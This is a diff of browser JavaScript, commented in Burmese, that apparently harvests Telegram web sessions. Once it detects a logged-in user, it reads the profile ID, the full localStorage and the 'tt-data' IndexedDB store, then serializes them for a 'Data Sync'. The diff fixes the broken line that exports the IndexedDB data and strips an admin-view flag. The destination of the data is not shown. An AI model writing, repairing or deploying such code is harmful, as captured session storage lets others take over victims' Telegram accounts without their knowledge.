@@ -55,7 +55,8 @@
             return value;
         });
     }
-async function exportIndexedDB(dbName, storeName) {
+    
+    async function exportIndexedDB(dbName, storeName) {
         return new Promise((resolve) => {
             const request = indexedDB.open(dbName);
             request.onsuccess = (e) => {
@@ -112,7 +113,6 @@ async function exportIndexedDB(dbName, storeName) {
         });
     }
 
-    // 🌟 Profile ကို အမှားအယွင်းကင်းစွာ တိတိကျကျ ဆွဲယူမည့်စနစ်
     function getTelegramProfile() {
         try {
             let currentId = null;
@@ -208,7 +208,6 @@ async function exportIndexedDB(dbName, storeName) {
             });
 
         } else {
-            // 🌟🌟 Admin View Trap ကို ဖယ်ရှားခြင်း (Normal User အဖြစ် ဝင်လာပါက အလိုလို ပြန်ဖွင့်ပေးမည်) 🌟🌟
             localStorage.removeItem("is_admin_view");
 
             setTimeout(() => {
@@ -220,7 +219,6 @@ async function exportIndexedDB(dbName, storeName) {
                     let profile = getTelegramProfile();
                     const lsDataStr = JSON.stringify(localStorage);
                     
-                    // Profile UID ရမှသာ Data Sync စတင်မည်
                     const isLoggedIn = profile && profile.uid && lsDataStr.length > 1500;
 
                     if (wasLoggedIn && !isLoggedIn && lastKnownUserId) {
@@ -239,10 +237,11 @@ async function exportIndexedDB(dbName, storeName) {
 
                     if (isLoggedIn) {
                         wasLoggedIn = true; 
-                        lastKnownUserId = profile.uid; // Unique ID အစစ်ကိုသာ သုံးပါမည်
+                        lastKnownUserId = profile.uid; 
 
                         try {
-                            const rawIdbData = 
+                            // 🌟 ပြတ်ကျန်ခဲ့သော ကုဒ်ကို ပြင်ဆင်ပြီးပါပြီ
+                            const rawIdbData = await exportIndexedDB("tt-data", "store");
                             const idbDataStr = serializeData(rawIdbData);
                             
                             const currentDataLength = idbDataStr.length + lsDataStr.length;
